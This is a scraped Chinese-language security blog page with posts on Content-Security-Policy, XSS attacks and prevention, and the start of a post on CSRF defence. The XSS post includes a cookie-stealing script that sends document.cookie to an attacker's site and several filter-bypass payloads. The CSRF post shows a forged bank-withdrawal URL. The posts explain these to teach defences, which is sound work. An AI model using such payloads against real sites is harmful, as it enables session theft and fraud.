-<p>另一种是通过网页的<meta>标签。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;; object-src &apos;none&apos;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</span><br></pre></td></tr></table></figure></p>
-<p>上面代码中，CSP 做了如下配置。</p>
-<ul>
-<li>脚本：只信任当前域名</li>
-<li><code>&lt;object&gt;</code>标签：不信任任何URL，即不加载任何资源</li>
-<li>样式表：只信任<code>cdn.example.org</code>和<code>third-party.org</code></li>
-<li>框架（frame）：必须使用HTTPS协议加载</li>
-<li>其他资源：没有限制</li>
-</ul>
-<p>启用后，不符合 CSP 的外部资源就会被阻止加载。</p>
-<h2 id="二、限制选项"><a href="#二、限制选项" class="headerlink" title="二、限制选项"></a>二、限制选项</h2><p>CSP 提供了很多限制选项，涉及安全的各个方面。</p>
-<h3 id="2-1-资源加载限制"><a href="#2-1-资源加载限制" class="headerlink" title="2.1 资源加载限制"></a>2.1 资源加载限制</h3><p>以下选项限制各类资源的加载。</p>
-<ul>
-<li><strong>script-src</strong>：外部脚本</li>
-<li><strong>style-src</strong>：样式表</li>
-<li><strong>img-src</strong>：图像</li>
-<li><strong>media-src</strong>：媒体文件（音频和视频）</li>
-<li><strong>font-src</strong>：字体文件</li>
-<li><strong>object-src</strong>：插件（比如 Flash）</li>
-<li><strong>child-src</strong>：框架</li>
-<li><strong>frame-ancestors</strong>：嵌入的外部资源（比如<code>&lt;frame&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;embed&gt;</code>和<code>&lt;applet&gt;</code>）</li>
-<li><strong>connect-src</strong>：HTTP 连接（通过 XHR、WebSockets、EventSource等）</li>
-<li><strong>worker-src</strong>：<code>worker</code>脚本</li>
-<li><strong>manifest-src</strong>：manifest 文件</li>
-</ul>
-<h3 id="2-2-default-src"><a href="#2-2-default-src" class="headerlink" title="2.2 default-src"></a>2.2 default-src</h3><p><code>default-src</code>用来设置上面各个选项的默认值。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;</span><br></pre></td></tr></table></figure>
-<p>上面代码限制<strong>所有的</strong>外部资源，都只能从当前域名加载。</p>
-<p>如果同时设置某个单项限制（比如<code>font-src</code>）和<code>default-src</code>，前者会覆盖后者，即字体文件会采用<code>font-src</code>的值，其他资源依然采用<code>default-src</code>的值。</p>
-<h3 id="2-3-URL-限制"><a href="#2-3-URL-限制" class="headerlink" title="2.3 URL 限制"></a>2.3 URL 限制</h3><p>有时，网页会跟其他 URL 发生联系，这时也可以加以限制。</p>
-<ul>
-<li><strong>frame-ancestors</strong>：限制嵌入框架的网页</li>
-<li><strong>base-uri</strong>：限制<code>&lt;base#href&gt;</code></li>
-<li><strong>form-action</strong>：限制<code>&lt;form#action&gt;</code></li>
-</ul>
-<h3 id="2-4-其他限制"><a href="#2-4-其他限制" class="headerlink" title="2.4 其他限制"></a>2.4 其他限制</h3><p>其他一些安全相关的功能，也放在了 CSP 里面。</p>
-<ul>
-<li><strong>block-all-mixed-content</strong>：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</li>
-<li><strong>upgrade-insecure-requests</strong>：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</li>
-<li><strong>plugin-types</strong>：限制可以使用的插件格式</li>
-<li><strong>sandbox</strong>：浏览器行为的限制，比如不能有弹出窗口等。</li>
-</ul>
-<h3 id="2-5-report-uri"><a href="#2-5-report-uri" class="headerlink" title="2.5 report-uri"></a>2.5 report-uri</h3><p>有时，我们不仅希望防止 XSS，还希望记录此类行为。<code>report-uri</code>就用来告诉浏览器，应该把注入行为报告给哪个网址。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; ...; report-uri /my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure>
-<p>上面代码指定，将注入行为报告给<code>/my_amazing_csp_report_parser</code>这个 URL。</p>
-<p>浏览器会使用<code>POST</code>方法，发送一个JSON对象，下面是一个例子。</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;csp-report&quot;: &#123;</span><br><span class="line">    &quot;document-uri&quot;: &quot;http://example.org/page.html&quot;,</span><br><span class="line">    &quot;referrer&quot;: &quot;http://evil.example.com/&quot;,</span><br><span class="line">    &quot;blocked-uri&quot;: &quot;http://evil.example.com/evil.js&quot;,</span><br><span class="line">    &quot;violated-directive&quot;: &quot;script-src &apos;self&apos; https://apis.google.com&quot;,</span><br><span class="line">    &quot;original-policy&quot;: &quot;script-src &apos;self&apos; https://apis.google.com; report-uri http://example.org/my_amazing_csp_report_parser&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="http://7xq1il.com1.z0.glb.clouddn.com/csp02.png" alt="img"></p>
-<h2 id="三、Content-Security-Policy-Report-Only"><a href="#三、Content-Security-Policy-Report-Only" class="headerlink" title="三、Content-Security-Policy-Report-Only"></a>三、Content-Security-Policy-Report-Only</h2><p>除了<code>Content-Security-Policy</code>，还有一个<code>Content-Security-Policy-Report-Only</code>字段，表示不执行限制选项，只是记录违反限制的行为。<br>它必须与<code>report-uri</code>选项配合使用。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy-Report-Only: <span class="keyword">default</span>-src <span class="string">'self'</span>; ...; report-uri /my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure>
-<h2 id="四、选项值"><a href="#四、选项值" class="headerlink" title="四、选项值"></a>四、选项值</h2><p>每个限制选项可以设置以下几种值，这些值就构成了白名单。</p>
-<ul>
-<li>主机名：<code>example.org</code>，<code>https://example.com:443</code></li>
-<li>路径名：<code>example.org/resources/js/</code></li>
-<li>通配符：<code>*.example.org</code>，<code>*://*.example.com:*</code>（表示任意协议、任意子域名、任意端口）</li>
-<li>协议名：<code>https:</code>、<code>data:</code></li>
-<li>关键字<code>&#39;self&#39;</code>：当前域名，需要加引号</li>
-<li>关键字<code>&#39;none&#39;</code>：禁止加载任何外部资源，需要加引号</li>
-</ul>
-<p>多个值也可以并列，用空格分隔。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">'self'</span> https:<span class="comment">//apis.google.com</span></span><br></pre></td></tr></table></figure></p>
-<p>如果同一个限制选项使用多次，只有第一次会生效。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 错误的写法</span><br><span class="line">script-src https:<span class="comment">//host1.com; script-src https://host2.com</span></span><br><span class="line"></span><br><span class="line"># 正确的写法</span><br><span class="line">script-src https:<span class="comment">//host1.com https://host2.com</span></span><br></pre></td></tr></table></figure></p>
-<p>如果不设置某个限制选项，就是默认允许任何值。</p>
-<h2 id="五、script-src-的特殊值"><a href="#五、script-src-的特殊值" class="headerlink" title="五、script-src 的特殊值"></a>五、script-src 的特殊值</h2><p>除了常规值，<code>script-src</code>还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。</p>
-<ul>
-<li><p><strong>‘unsafe-inline’</strong>：允许执行页面内嵌的<code>&amp;lt;script&gt;</code>标签和事件监听函数</p>
-</li>
-<li><p><strong>unsafe-eval</strong>：允许将字符串当作代码执行，比如使用<code>eval</code>、<code>setTimeout</code>、<code>setInterval</code>和<code>Function</code>等函数。</p>
-</li>
-<li><p><strong>nonce值</strong>：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行</p>
-</li>
-<li><p><strong>hash值</strong>：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</p>
-</li>
-</ul>
-<p>以 Node.js 为例, 计算脚本的 hashes 值:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getHashByCode</span>(<span class="params">code, algorithm = <span class="string">'sha256'</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> algorithm + <span class="string">'-'</span> + crypto.createHash(algorithm).update(code, <span class="string">'utf8'</span>).digest(<span class="string">"base64"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getHashByCode(<span class="string">'console.log("hello world");'</span>); <span class="comment">// 'sha256-wxWy1+9LmiuOeDwtQyZNmWpT0jqCUikqaqVlJdtd</span></span><br></pre></td></tr></table></figure></p>
-<p>nonce值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的token。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">'nonce-EDNnf03nceIOfn39fn3e9h3sdfa'</span></span><br></pre></td></tr></table></figure>
-<p>页面内嵌脚本，必须有这个token才能执行。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&gt;</span><br><span class="line">   <span class="comment">// some code</span></span><br><span class="line"> &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
-<p>hash值的例子如下，服务器给出一个允许执行的代码的hash值。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src <span class="string">'sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng='</span></span><br></pre></td></tr></table></figure>
-<p>下面的代码就会允许执行，因为hash值相符。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'Hello, world.'</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>注意，计算hash值的时候，<script>标签不算在内。<br>除了<code>script-src</code>选项，nonce值和hash值还可以用在<code>style-src</code>选项，控制页面内嵌的样式表。</p>
-<h2 id="六、注意点"><a href="#六、注意点" class="headerlink" title="六、注意点"></a>六、注意点</h2><p>（1）<code>script-src</code>和<code>object-src</code>是必设的，除非设置了<code>default-src</code>。</p>
-<p>因为攻击者只要能注入脚本，其他限制都可以规避。而<code>object-src</code>必设是因为 Flash 里面可以执行外部脚本。</p>
-<p>（2）<code>script-src</code>不能使用<code>unsafe-inline</code>关键字（除非伴随一个nonce值），也不能允许设置<code>data:</code>URL。</p>
-<p>下面是两个恶意攻击的例子。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"x"</span> onerror=<span class="string">"evil()"</span>&gt;</span><br><span class="line">&lt;script src=<span class="string">"data:text/javascript,evil()"</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>（3）必须特别注意 JSONP 的回调函数。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">  src=<span class="string">"/path/jsonp?callback=alert(document.domain)//"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
-<p>上面的代码中，虽然加载的脚本来自当前域名，但是通过改写回调函数，攻击者依然可以执行恶意代码。</p>
-<h3 id="原文：http-www-ruanyifeng-com-blog-2016-09-csp-html"><a href="#原文：http-www-ruanyifeng-com-blog-2016-09-csp-html" class="headerlink" title="原文：http://www.ruanyifeng.com/blog/2016/09/csp.html"></a>原文：<a href="http://www.ruanyifeng.com/blog/2016/09/csp.html">http://www.ruanyifeng.com/blog/2016/09/csp.html</a></h3></script></p>
-      
-    </div>
-    <footer>
-      
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2017-02-18T06:45:23.000Z"><a href="/2017/02/18/网络安全/XSS攻击及预防/">2017-02-18</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2017/02/18/网络安全/XSS攻击及预防/">XSS攻击及预防</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h2 id="XSS攻击是什么"><a href="#XSS攻击是什么" class="headerlink" title="XSS攻击是什么"></a>XSS攻击是什么</h2><ul>
-<li>XSS又称CSS，全称Cross SiteScript跨站脚本攻击的缩写，是一种网站应用程序的安全漏洞攻击，是代码注入的一种。</li>
-<li>通常是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。</li>
-<li>这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。</li>
-<li>攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和盗取用户Cookie、破坏页面结构、重定向到其它网站等</li>
-</ul>
-<h3 id="XSS攻击基本原理——代码注入"><a href="#XSS攻击基本原理——代码注入" class="headerlink" title="XSS攻击基本原理——代码注入"></a>XSS攻击基本原理——代码注入</h3><p>在web的世界里有各种各样的语言，于是乎对于语句的解析大家各不相同，有一些语句在一种语言里是合法的，但是在另外一种语言里是非法的。这种二义性使得黑客可以用代码注入的方式进行攻击——将恶意代码注入合法代码里隐藏起来，再诱发恶意代码，从而进行各种各样的非法活动。只要破坏跨层协议的数据/指令的构造，我们就能攻击。<br>历史悠久的<code>SQL注入</code>和<code>XSS注入</code>都是这种攻击方式的典范。现如今，随着参数化查询的普及，我们已经离<code>SQL注入</code>很远了。但是，历史同样悠久的<code>XSS</code>却没有远离我们。<br><code>XSS</code>的基本实现思路很简单——比如<code>持久型XSS</code>通过一些正常的站内交互途径，例如发布评论，提交含有<code>JavaScript</code>的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本，从而被攻击。</p>
-<p>攻击分类举例</p>
-<h3 id="DOM-based-XSS"><a href="#DOM-based-XSS" class="headerlink" title="DOM-based XSS"></a>DOM-based XSS</h3><p>基于DOM的XSS，通过对具体DOM代码进行分析，根据实际情况构造dom节点进行XSS跨站脚本攻击，该攻击特点是中招的人是少数人。<br><strong>场景一</strong>：<br>当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">language</span>=<span class="string">"java"</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span> <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span>%&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPEhtmlPUBLIC"-//W3C//DTD HTML 4.01 Transitional//EN""http://www.w3.org/TR/html4/loose.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   页面内容：<span class="tag">&lt;<span class="name">%=request.getParameter("content")%</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：<a href="http://www.a.com?content=" target="_blank" rel="noopener">http://www.a.com?content=</a><script>window.open(“<a href="http://www.b.com?param=”+document.cookie">www.b.com?param=”+document.cookie</a>)</script>，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！这个过程中，受害者只有Tom自己。那当我在浏览器输入a.com?content=<script>alert(“xss”)</script>，浏览器展示页面内容的过程中，就会执行我的脚本，页面输出xss字样，这是攻击了我自己，那我如何攻击别人并且获利呢？</p>
-<h3 id="持久型XSS"><a href="#持久型XSS" class="headerlink" title="持久型XSS"></a>持久型XSS</h3><p>也叫存储型XSS——主动提交恶意数据到服务器，攻击者在数据中嵌入代码，这样当其他用户请求后，服务器从数据库中查询数据并发给用户，用户浏览此类页面时就可能受到攻击。由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。可以描述为:恶意用户的HTML或JS输入服务器-&gt;进入数据库-&gt;服务器响应时查询数据库-&gt;用户浏览器。</p>
-<p><strong>场景二</strong>：<br>a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“<a href="http://www.b.com?param=”+document.cookie">www.b.com?param=”+document.cookie</a>)</script>，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。Stored XSS漏洞危害性更大，危害面更广。</p>
-<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射性XSS，也就是被动的非持久性XSS。诱骗用户点击URL带攻击代码的链接，服务器解析后响应，在返回的响应内容中隐藏和嵌入攻击者的XSS代码，被浏览器执行，从而攻击用户。<br>URL可能被用户怀疑，但是可以通过短网址服务将之缩短，从而隐藏自己。</p>
-<h3 id="使用XSS-Filter"><a href="#使用XSS-Filter" class="headerlink" title="使用XSS Filter"></a>使用XSS Filter</h3><ul>
-<li><p>输入过滤，所有用户输入都是不可信的。”（注意: 攻击代码不一定在<script></script>中），对用户提交的数据进行有效性验证，仅接受指定长度范围内并符合我们期望格式的的内容提交，阻止或者忽略除此外的其他任何数据。</p>
-<p>| less-than character (&lt;)                                      | &lt;                                                     |<br>| ———————————————————— | ——————————————————– |<br>| greater-than character (&gt;)                                   | &gt;                                                     |<br>| ampersand character (&amp;)                                      | &amp;                                                    |<br>| double-quote character (“)                                   | &quot;                                                   |<br>| space character( )                                           | &nbsp;                                                   |<br>| Any ASCII code character whose code is greater-than or equal to 0x80 | &amp;#<number>, where <number> is the ASCII character value. |</number></number></p>
-</li>
-</ul>
-<p>比如用户输入：<script>window.location.href=”<a href="http://www.baidu.com”">http://www.baidu.com”</a>;</script>，保存后最终存储的会是&lt;script&gt;window.location.href=&quot;<a href="http://www.baidu.com&quot;&lt;/script&gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。" target="_blank" rel="noopener">http://www.baidu.com&quot;&lt;/script&gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。</a></p>
-<ul>
-<li>输出转义，当需要将一个字符串输出到Web网页时，同时又不确定这个字符串中是否包括XSS特殊字符，为了确保输出内容的完整性和正确性，输出HTML属性时可以使用HTML转义编码（HTMLEncode）进行处理，输出到<script>中，可以进行JS编码。</li>
-</ul>
-<h3 id="使用-HttpOnly-Cookie"><a href="#使用-HttpOnly-Cookie" class="headerlink" title="使用 HttpOnly Cookie"></a>使用 HttpOnly Cookie</h3><p>将重要的cookie标记为httponly，这样的话当浏览器向Web服务器发起请求的时就会带上<code>cookie</code>字段，但是在<code>js</code>脚本中却不能访问这个cookie，这样就避免了XSS攻击利用<code>JavaScript</code>的<code>document.cookie</code>获取<code>cookie</code>。</p>
-<h3 id="CSP策略"><a href="#CSP策略" class="headerlink" title="CSP策略"></a>CSP策略</h3><p>单篇说</p>
-<h3 id="困难和幸运"><a href="#困难和幸运" class="headerlink" title="困难和幸运"></a>困难和幸运</h3><p>过滤 Html 标签能否防止 XSS? 请列举不能的情况?</p>
-<p>用户除了上传</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;xss&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>还可以使用图片 url 等方式来上传脚本进行攻击</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=&quot;javascript:alert(/xss/)&quot;&gt;&lt;/table&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(&apos;xss&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>还可以使用各种方式来回避检查, 例如空格, 回车, Tab</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas cript:</span><br><span class="line">alert(&apos;xss&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>还可以通过各种编码转换 (URL 编码, Unicode 编码, HTML 编码, ESCAPE 等) 来绕过检查</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%20src=%22javascript:alert(&apos;xss&apos;);%22&gt;</span><br><span class="line">&lt;img src=&quot;javascrip&amp;#116&amp;#58alert(/xss/)&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>真正麻烦的是，在一些场合我们要允许用户输入HTML，又要过滤其中的脚本。这就要求我们对代码小心地进行转义。否则，我们可能既获取不了用户的正确输入，又被XSS攻击。<br>幸好，由于XSS臭名昭著历史悠久又极其危险，现代web开发框架如<code>vue.js</code>、<code>react.js</code>等，在设计的时候就考虑了XSS攻击对html插值进行了更进一步的抽象、过滤和转义，我们只要熟练正确地使用他们，就可以在大部分情况下避免XSS攻击。<br>同时，许多基于<code>MVVM</code>框架的<code>SPA</code>（单页应用）不需要刷新URL来控制view，这样大大防止了XSS隐患。另外，我们还可以用一些防火墙来阻止XSS的运行。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/ghsau/article/details/17027893">https://blog.csdn.net/ghsau/article/details/17027893</a></p>
-<p><a href="https://www.imooc.com/article/13553">https://www.imooc.com/article/13553</a></p>
-<p><a href="https://blog.csdn.net/u011781521/article/details/53894399">https://blog.csdn.net/u011781521/article/details/53894399</a></p>
-<p><a href="https://elemefe.github.io/node-interview/#/sections/zh-cn/security?id=xss">https://elemefe.github.io/node-interview/#/sections/zh-cn/security?id=xss</a></p>
-</script></li></ul>
-      
-    </div>
-    <footer>
-      
-        
-        
-      
-      <div class="clearfix"></div>
-    </footer>
-  </div>
-</article>
-
-
-
-
-  <article class="post">
-  
-  <div class="post-content">
-    <header>
-      
-        <div class="icon"></div>
-        <time datetime="2017-02-16T06:45:23.000Z"><a href="/2017/02/16/网络安全/CSRF攻击及预防/">2017-02-16</a></time>
-      
-      
-  
-    <h1 class="title"><a href="/2017/02/16/网络安全/CSRF攻击及预防/">CSRF攻击及预防</a></h1>
-  
-
-    </header>
-    <div class="entry">
-      
-        <h2 id="什么是CSRF？"><a href="#什么是CSRF？" class="headerlink" title="什么是CSRF？"></a>什么是CSRF？</h2><p>CSRF（Cross-Site Request Forgery，跨站点伪造请求，也被称为：one click attack/session riding，缩写为：CSRF/XSRF）是一种网络攻击方式，该攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在未授权的情况下执行在权限保护之下的操作，具有很大的危害性。具体来讲，可以这样理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
-<h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h2><p>下图简单阐述了CSRF的原理:</p>
-<p><img src="http://7xq1il.com1.z0.glb.clouddn.com/csrf.jpg" alt=""></p>
-<p>从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成以下两个步骤：</p>
-<ul>
-<li>登录受信任网站A，并在本地生成Cookie。</li>
-<li>在不登出A的情况下，访问危险网站B。</li>
-</ul>
-<p>看到这里，你也许会问：“如果我不满足以上两个条件中的一个，我就不会受到CSRF攻击”。是滴，确实如此，但是你不能保证以下情况不会发生：</p>
-<ul>
-<li>你不能保证你登录了一个网站之后，不再打开一个tab页面并访问其它的网站。</li>
-<li>你不能保证你关闭浏览器之后，你本地的Cookie立刻过期，你上次的会话已经结束。</li>
-<li>上述中所谓的攻击网站，可能就是一个钓鱼网站。</li>
-</ul>
-<h2 id="CSRF攻击实例"><a href="#CSRF攻击实例" class="headerlink" title="CSRF攻击实例"></a>CSRF攻击实例</h2><p>CSRF 攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在并未授权的情况下执行在权限保护之下的操作。比如说，受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2</a> 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自</a> Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</a> ”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。</p>
-<h2 id="CSRF如何防御"><a href="#CSRF如何防御" class="headerlink" title="CSRF如何防御"></a>CSRF如何防御</h2><h3 id="验证-HTTP-Referer-字段"><a href="#验证-HTTP-Referer-字段" class="headerlink" title="验证 HTTP Referer 字段"></a>验证 HTTP Referer 字段</h3><p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆</a> bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</p>
